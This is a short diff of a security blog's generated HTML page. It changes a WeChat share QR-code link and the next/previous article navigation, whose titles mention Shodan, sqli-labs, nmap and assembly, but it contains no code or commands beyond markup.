     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/05/03/shodan%E4%BD%BF%E7%94%A8%E5%8F%8Apoc%E6%89%B9%E9%87%8F/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/06/09/sqli-labs/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -378,9 +606,18 @@ for result in results[&#39;matches&#39;]:
   
 <nav id="article-nav">
   
+    <a href="/2021/07/14/nmap%E7%9B%B8%E5%85%B3/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          nmap相关
+        
+      </div>
+    </a>
   
-    <a href="/2022/05/01/Vs2022%E8%87%AA%E5%B8%A6%E5%85%8D%E6%9D%80dump/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Vs2022自带免杀dump</div>
+  
+    <a href="/2020/04/29/%E6%B1%87%E7%BC%96%E7%9B%B8%E5%85%B3/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">汇编相关</div>
       <i class="icon-circle-right"></i>
     </a>
   
